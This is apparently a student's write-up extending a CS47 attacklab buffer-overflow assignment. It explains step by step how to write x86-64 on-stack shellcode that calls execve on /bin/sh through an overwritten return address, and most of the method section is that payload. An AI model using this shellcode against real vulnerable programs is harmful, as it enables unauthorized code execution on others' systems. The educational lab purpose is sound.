# Attacklab-Extension
Using the CS47 attacklab in a Cybersec Application

## Intro
In the attacklab, we've seen all the touch procedures/functions that we eventually had to call. These functions acted as "dummy" procedures to gain points to continue further on the lab. In a real life cybersec perspective, these dummy procedures would be like attacknodes, gaining access to something that the regular user cannot.

## Idea
We explored two of the most common and baseline techniques of buffer overflow attacks: On-stack execution and ROP chaining. Both of these techniques are still extremely relavent today and are the basis of more sophisticated exploitation methods. However, in the lab, both of these techniques were used to call the touch functions mentioned above. This may be the limitation to ROP chaining, but for on-stack execution, we can do a lot more than call a function or pass in arguments. In fact, we are able to create our own procedure. One of the procedures that most commonly known in the "hacking" industry is the shell. 

## Method
The shell is a program that can be executed under most operating systems under the directory /bin/sh. Using this, we can pass in arguments and assembly instructions in our on-stack executable shellcode that allow us to spawn in this process.
### Start
To start, we first have to think about how we're able to run a process. When we run a program, it automatically forks itself and continues execution with the program. The execution and forking are because of syscalls. Turns out, there is an assembly instruction that allows us to use these syscalls. In fact it is so simple if you type in syscall in your .s file, compile it and use objdump on it, it'll display 0f 05. However, it is not that simple. These syscall instructions require specific values in the registers before being executed. 
### Arguments
There is a list of syscalls each with ids. These ids will be very important and in fact will be one of the "arguments" we will be passing. The specific syscall we are interested in is called "execve". In summary, this syscall basically replaces the current running process with whatever you want, depending on the other arguments. 
\n
The second argument we want to pass is the path of the executable that the program will replace it with. In this case, it is /bin/sh.
The third argument is a list of parameters including the path of the executable as the first list. More specifically, this will point to a list of string pointers of your arguments.
The fourth argument is an optional argument where we use it to pass in any environment variables.
## Assembly Translation
### 1st step
We first need to pass in the syscall id of 59 into our register rax. This is where you store your syscall ids if you want to call a specific one. The id of 59 belongs to the syscall execve. 
Payload so far: 
push $59
pop %rax
[ buffer bytes ]
[ modified ret addr to instructions ]
It is "good" practice to use push and pop to force constants into registers because using mov uses a lot more bytes than push/pop and also runs into the risk of allowing null bytes in your instruction set, which might indicate to programs that it is the end of your string, but luckily, not in this case.

### 2nd step
We then need to pass the pointer to our string of the path of our executable which is /bin/sh. We can store this somewhere in our buffer and pass in the pointer to the start of the string.
Payload so far:
push $59
pop %rax
push addr_to_/bin/sh
pop %rdi
[ /bin/sh somewhere + buffer bytes ]
[modified ret addr to instructions ]
### Third step
Third step is we need to pass in a pointer to our list of pointers to our parameters. Since we don't have any parameters and just want to run /bin/sh, we can point to the pointer referencing /bin/sh and end it with a null value.
Payload so far:
push $59
pop %rax
push addr_to_/bin/sh
pop %rdi
push addr_to_pointer_to_/bin/sh
pop %rsi
[ /bin/sh somewhere + pointer to /bin/sh + 8 null bytes +  buffer bytes ]
[modified ret addr to instructions ]
### Fourth step
We can just pass a null value into our third parameter since we're not using it.
Payload so far:
push $59
pop %rax
push addr_to_/bin/sh
pop %rdi
push addr_to_pointer_to_/bin/sh
pop %rsi
xorq %rdx,%rdx
[ /bin/sh somewhere + pointer to /bin/sh + 8 null bytes +  buffer bytes ]
[modified ret addr to instructions ]
### Final step
We can just finally call syscall in our final instruction.
push $59
pop %rax
push addr_to_/bin/sh
pop %rdi
push addr_to_pointer_to_/bin/sh
pop %rsi
xorq %rdx,%rdx
syscall
[ /bin/sh somewhere + pointer to /bin/sh + 8 null bytes +  buffer bytes ]
[modified ret addr to instructions ]
